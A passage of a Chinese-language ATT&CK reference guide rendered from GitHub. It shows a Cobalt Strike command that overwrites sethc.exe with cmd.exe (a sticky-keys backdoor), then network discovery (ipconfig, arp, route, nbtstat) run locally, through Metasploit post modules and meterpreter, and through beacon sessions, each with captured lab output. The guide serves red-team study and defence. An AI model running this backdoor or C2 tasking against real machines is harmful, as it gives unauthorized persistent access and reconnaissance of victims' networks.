beacon<span class="pl-k">&gt;</span> shell copy C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\c</span>md.exe C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.exe
[<span class="pl-k">*</span>] Tasked beacon to run: copy C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\c</span>md.exe C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.exe
[+] host called home, sent: 157 bytes
[+] received output:
已复制         1 个文件。
</pre></div>
<h2><a id="user-content-system-network-configuration-discovery系统网络配置发现" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#system-network-configuration-discovery%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>System Network Configuration Discovery（系统网络配置发现）</h2>
<h3><a id="user-content-get-network-information发现网络信息" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-network-information%E5%8F%91%E7%8E%B0%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get network information（发现网络信息）</h3>
<h4><a id="user-content-terminal下操作-2" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>ipconfig /all</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>ipconfig /all

Windows IP Configuration

   Host Name <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> root-5de52ac98b
   Primary Dns Suffix  <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span>
   Node Type <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> Unknown
   IP Routing Enabled. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> No
   WINS Proxy Enabled. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> No

Ethernet adapter 本地连接:

   Connection-specific DNS Suffix  <span class="pl-c1">.</span> <span class="pl-c1">:</span>
   Description <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> Intel(R) PRO/1000 MT Network Connection
   Physical Address. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 00-0C-29-D4-66-73
   DHCP Enabled. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> Yes
   Autoconfiguration Enabled <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> Yes
   IP Address. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 192.168.2.114
   Subnet Mask <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 255.255.255.0
   Default Gateway <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 192.168.2.1
   DHCP Server <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 192.168.2.1
   DNS Servers <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 192.168.2.1
   Lease Obtained. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 2019年9月4日 19:14:12
   Lease Expires <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 2019年9月5日 19:14:12

C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>
</pre></div>
<h4><a id="user-content-msf下操作-4" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-4"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>post/windows/gather/enum_domains</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 post(windows/gather/enum_domains) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Enumerating DCs <span class="pl-k">for</span> WORKGROUP
[-] No Domain Controllers found...
[<span class="pl-k">*</span>] Post module execution completed
</pre></div>
<h4><a id="user-content-cs下操作-5" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-5"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell ipconfig /all</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell ipconfig /all
[<span class="pl-k">*</span>] Tasked beacon to run: ipconfig /all
[+] host called home, sent: 44 bytes
[+] received output:


Windows IP Configuration



   Host Name <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> root-5de52ac98b

   Primary Dns Suffix  <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 

   Node Type <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> Unknown

   IP Routing Enabled. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> No

   WINS Proxy Enabled. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> No



Ethernet adapter 本地连接:



   Connection-specific DNS Suffix  <span class="pl-c1">.</span> <span class="pl-c1">:</span> 

   Description <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> Intel(R) PRO/1000 MT Network Connection

   Physical Address. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 00-0C-29-D4-66-73

   DHCP Enabled. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> Yes

   Autoconfiguration Enabled <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> Yes

   IP Address. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 192.168.2.114

   Subnet Mask <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 255.255.255.0

   Default Gateway <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 192.168.2.1

   DHCP Server <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 192.168.2.1

   DNS Servers <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 192.168.2.1

   Lease Obtained. <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 2019年9月4日 19:14:12

   Lease Expires <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">.</span> <span class="pl-c1">:</span> 2019年9月5日 19:14:12


</pre></div>
<h3><a id="user-content-get-arp-table获取arp表" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-arp-table%E8%8E%B7%E5%8F%96arp%E8%A1%A8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get ARP table(获取arp表)</h3>
<h4><a id="user-content-terminal下操作-3" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作</h4>
<blockquote>
<p>arp -a</p>
<p>router print</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>arp -a

Interface: 192.168.2.114 --- 0x10003
  Internet Address      Physical Address      Type
  192.168.2.1           fc-7c-02-de-0e-c8     dynamic
  192.168.2.107         b4-6b-fc-47-ad-60     dynamic</pre></div>
<h4><a id="user-content-msf下操作-5" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-5"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>router</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>meterpreter <span class="pl-k">&gt;</span> route 

IPv4 network routes
===================

    Subnet           Netmask          Gateway        Metric  Interface
    ------           -------          -------        ------  ---------
    0.0.0.0          0.0.0.0          192.168.2.1    10      65539
    127.0.0.0        255.0.0.0        127.0.0.1      1       1
    192.168.2.0      255.255.255.0    192.168.2.114  10      65539
    192.168.2.114    255.255.255.255  127.0.0.1      10      1
    192.168.2.255    255.255.255.255  192.168.2.114  10      65539
    224.0.0.0        240.0.0.0        192.168.2.114  10      65539
    255.255.255.255  255.255.255.255  192.168.2.114  1       65539
</pre></div>
<h4><a id="user-content-cs下操作-6" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>arp -a</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell arp -a
[<span class="pl-k">*</span>] Tasked beacon to run: arp -a
[+] host called home, sent: 37 bytes
[+] received output:

Interface: 192.168.2.114 --- 0x10003
  Internet Address      Physical Address      Type
  192.168.2.1           fc-7c-02-de-0e-c8     dynamic   
  192.168.2.107         b4-6b-fc-47-ad-60     dynamic
</pre></div>
<h3><a id="user-content-dump-mac-ip-addresses-and-codes获取macip地址和其描述性代码" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#dump-mac-ip-addresses-and-codes%E8%8E%B7%E5%8F%96macip%E5%9C%B0%E5%9D%80%E5%92%8C%E5%85%B6%E6%8F%8F%E8%BF%B0%E6%80%A7%E4%BB%A3%E7%A0%81"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Dump MAC, IP addresses and codes(获取mac、ip地址和其描述性代码)</h3>
<p>用于获取计算机的MAC和IP地址以及一些描述性代码(0x1C表示一个域控制器)</p>
<h4><a id="user-content-termainal下操作" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#termainal%E4%B8%8B%E6%93%8D%E4%BD%9C"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>termainal下操作：</h4>
<blockquote>
<p>nbtstat -a ip</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>nbtstat -a ip

本地连接:
Node IpAddress: [192.168.2.114] Scope Id: []

           NetBIOS Remote Machine Name Table

       Name               Type         Status
    ---------------------------------------------
    ROOT-5DE52AC98B<span class="pl-k">&lt;</span>0<span class="pl-k">0&gt;</span>  UNIQUE      Registered
    WORKGROUP      <span class="pl-k">&lt;</span>0<span class="pl-k">0&gt;</span>  GROUP       Registered
    ROOT-5DE52AC98B<span class="pl-k">&lt;</span>2<span class="pl-k">0&gt;</span>  UNIQUE      Registered
    WORKGROUP      <span class="pl-k">&lt;</span>1E<span class="pl-k">&gt;</span>  GROUP       Registered
    WORKGROUP      <span class="pl-k">&lt;</span>1D<span class="pl-k">&gt;</span>  UNIQUE      Registered
    ..__MSBROWSE__.<span class="pl-k">&lt;</span>0<span class="pl-k">1&gt;</span>  GROUP       Registered

    MAC Address = 00-0C-29-D4-66-73

</pre></div>
<h4><a id="user-content-cs下操作-7" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-7"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell c:\windows\system32\nbtstat.exe -a ip</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell c:<span class="pl-cce">\w</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\n</span>btstat.exe -a 192.168.2.114
[<span class="pl-k">*</span>] Tasked beacon to run: c:<span class="pl-cce">\w</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\n</span>btstat.exe -a 192.168.2.114
[+] host called home, sent: 79 bytes
[+] received output:
    
本地连接:
Node IpAddress: [192.168.2.114] Scope Id: []



           NetBIOS Remote Machine Name Table



       Name               Type         Status

    ---------------------------------------------

    ROOT-5DE52AC98B<span class="pl-k">&lt;</span>0<span class="pl-k">0&gt;</span>  UNIQUE      Registered 

    WORKGROUP      <span class="pl-k">&lt;</span>0<span class="pl-k">0&gt;</span>  GROUP       Registered 

    ROOT-5DE52AC98B<span class="pl-k">&lt;</span>2<span class="pl-k">0&gt;</span>  UNIQUE      Registered 

    WORKGROUP      <span class="pl-k">&lt;</span>1E<span class="pl-k">&gt;</span>  GROUP       Registered 

    WORKGROUP      <span class="pl-k">&lt;</span>1D<span class="pl-k">&gt;</span>  UNIQUE      Registered 

    ..__MSBROWSE__.<span class="pl-k">&lt;</span>0<span class="pl-k">1&gt;</span>  GROUP       Registered 



    MAC Address = 00-0C-29-D4-66-73
</pre></div>
